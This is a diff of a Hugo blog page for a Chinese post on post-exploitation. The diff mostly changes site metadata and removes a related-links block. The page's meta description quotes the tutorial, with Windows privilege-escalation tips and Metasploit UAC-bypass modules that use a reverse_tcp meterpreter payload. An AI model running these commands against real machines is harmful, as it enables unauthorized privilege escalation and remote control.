@@ -7,7 +7,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>hvv_后渗透 - Sc0fie1d</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="hvv_后渗透" />
+    <title>hvv_后渗透 - Sc0fie1d</title><meta name="Description" content="sofield&#39;s blog"><meta property="og:title" content="hvv_后渗透" />
 <meta property="og:description" content="权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
 windows提权Windows常见权限分类：
 1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
@@ -27,8 +27,8 @@ windows提权Windows常见权限分类：
 1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
 （权限为Administrator时大概率会成功，其他可能需要绕UAC）
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2."/>
-<meta name="application-name" content="DoIt">
-<meta name="apple-mobile-web-app-title" content="DoIt">
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
 
 <meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hvv_post_penetration/" /><link rel="prev" href="http://scofield1920.github.io/hvv_emergency_response/" /><link rel="next" href="http://scofield1920.github.io/hvv_middleware_bug/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
@@ -1430,41 +1430,7 @@ web服务器：192.168.1.2
 </ul>
 </div>
 
-        
-
-
-<h2>Related Content</h2>
-<div class="related-container">
-    <div class="related-item-container">
-            <h2 class="related-title">
-                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
-            </h2>
-        </div>
-    <div class="related-item-container">
-            <h2 class="related-title">
-                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
-            </h2>
-        </div>
-    <div class="related-item-container">
-            <h2 class="related-title">
-                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
-            </h2>
-        </div>
-    <div class="related-item-container">
-            <h2 class="related-title">
-                <a href="/ctfshow_file_include/">ctfshow_file_include</a>
-            </h2>
-        </div>
-    <div class="related-item-container">
-            <h2 class="related-title">
-                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
-            </h2>
-        </div>
-    
-
-</div>
-
-<div class="post-footer" id="post-footer">
+        <div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -1514,7 +1480,7 @@ web服务器：192.168.1.2
         </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
                     Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
